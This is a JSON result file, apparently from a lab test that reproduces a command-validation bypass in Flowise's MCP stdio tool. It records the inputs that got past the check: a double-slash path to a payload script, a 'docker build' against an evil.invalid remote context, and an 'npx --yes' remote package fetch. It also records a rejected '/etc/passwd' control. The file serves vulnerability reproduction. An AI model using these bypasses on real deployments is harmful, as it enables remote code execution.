@@ -1,0 +1,63 @@
+{
+  "target_ready": true,
+  "execution_status": "completed",
+  "scenario": "attack",
+  "variant": "vulnerable",
+  "package_entry": "/lab/mcp/node_modules/flowise-components/dist/nodes/tools/MCP/core.js",
+  "package_entry_present": true,
+  "node_returncode": 0,
+  "config_source": "fixtures/attack_config.json",
+  "resolved_command": "node",
+  "resolved_args": [
+    "//lab/fixtures/mcp_payload.js"
+  ],
+  "validation": "accepted",
+  "validation_error": null,
+  "negative_control": "rejected",
+  "negative_control_error": "Argument contains potential local file access: \"/etc/passwd\"",
+  "toolkit_error": "MCP error -32000: Connection closed",
+  "tools": null,
+  "tool_call_result": null,
+  "bypass_assertions": [
+    {
+      "id": "rce_local_file_via_double_slash",
+      "command": "node",
+      "args": [
+        "//lab/fixtures/mcp_payload.js"
+      ],
+      "allowed": true,
+      "error": null
+    },
+    {
+      "id": "docker_build_remote_context",
+      "command": "docker",
+      "args": [
+        "build",
+        "https://evil.invalid/"
+      ],
+      "allowed": true,
+      "error": null
+    },
+    {
+      "id": "npx_yes_remote_package",
+      "command": "npx",
+      "args": [
+        "--yes",
+        "ghsa-mcp-nonexistent-package"
+      ],
+      "allowed": true,
+      "error": null
+    }
+  ],
+  "child_process_executed": true,
+  "child_effect": "ghsa-mcp-stdio-child-executed /lab/fixtures/mcp_payload.js\n",
+  "observation_note": "the MCP stdio transport spawned a real node child process and the pre-staged JavaScript wrote this marker",
+  "schema_version": 1,
+  "context": {
+    "schema_version": 1,
+    "run_id": "20260927T032248Z-5c9953a43b42",
+    "case_id": "02-vulnerable-attack",
+    "variant": "vulnerable",
+    "scenario": "attack"
+  }
+}
